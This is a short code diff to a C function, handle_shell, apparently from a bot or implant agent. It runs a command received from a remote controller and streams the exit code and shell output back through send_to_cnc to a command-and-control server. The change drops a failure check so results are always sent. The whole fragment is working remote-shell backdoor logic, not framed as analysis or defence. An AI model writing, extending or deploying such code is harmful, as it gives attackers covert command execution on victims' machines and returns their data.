@@ -69,21 +69,16 @@ void handle_shell()
         return;
     }
     log_info("Command: \"%s\"", cmd.cmd);
-    ret = shell(&cmd);
+    shell(&cmd);
     free(cmd.cmd);
-    if (ret == EXEC_SHELL_FAILED)
-        send_to_cnc(&ret, sizeof(ret));
-    else
+    send_to_cnc(&cmd.exit_code, sizeof(cmd.exit_code));
+    while (TRUE)
     {
-        send_to_cnc(&cmd.exit_code, sizeof(cmd.exit_code));
-        while (TRUE)
-        {
-            bytes_read = read_shell_output(out, sizeof(out));
-            send_to_cnc(&bytes_read, sizeof(bytes_read));
-            if (!bytes_read)
-                return;
-            send_to_cnc(out, bytes_read);
-        }
+        bytes_read = read_shell_output(out, sizeof(out));
+        send_to_cnc(&bytes_read, sizeof(bytes_read));
+        if (!bytes_read)
+            return;
+        send_to_cnc(out, bytes_read);
     }
 }
 
